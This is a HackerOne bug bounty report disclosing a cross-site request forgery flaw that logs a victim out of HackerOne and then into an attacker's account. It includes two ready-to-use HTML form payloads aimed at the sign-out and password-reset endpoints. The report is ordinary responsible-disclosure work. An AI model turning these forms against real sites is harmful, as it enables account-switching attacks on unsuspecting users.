# HackerOne Report: Switching the user to the attacker's account
**Report ID:** 727
**Vulnerability Class:** Cross-Site Request Forgery (CSRF)

## Vulnerability Information & PoC
Two requests are needed to make it happen.

Request1 (log out the user):

<html>
  <body>
    <form action="https://hackerone.com/users/sign_out" method="POST">
      <input type="hidden" name="&#95;method" value="delete" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

Request2 (log in the user to the attacker's account):

<html>
  <body>
    <form action="https://hackerone.com/users/password" method="POST">
      <input type="hidden" name="utf8" value="â&#156;&#147;" />
      <input type="hidden" name="&#95;method" value="put" />
      <input type="hidden" name="user&#91;reset&#95;password&#95;token&#93;" value="ENTER_HERE_RESET_PASSWORD_TOKEN_FROM_MAIL" />
      <input type="hidden" name="user&#91;password&#93;" value="ENTER_HERE_NEW_PASSWORD" />
      <input type="hidden" name="user&#91;password&#95;confirmation&#93;" value="ENTER_HERE_NEW_PASSWORD" />
      <input type="hidden" name="commit" value="Change&#32;password" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

Please let me know if more detailed description is needed.

Regards,
Dawid Czagan

## Discussion & Remediation Timeline
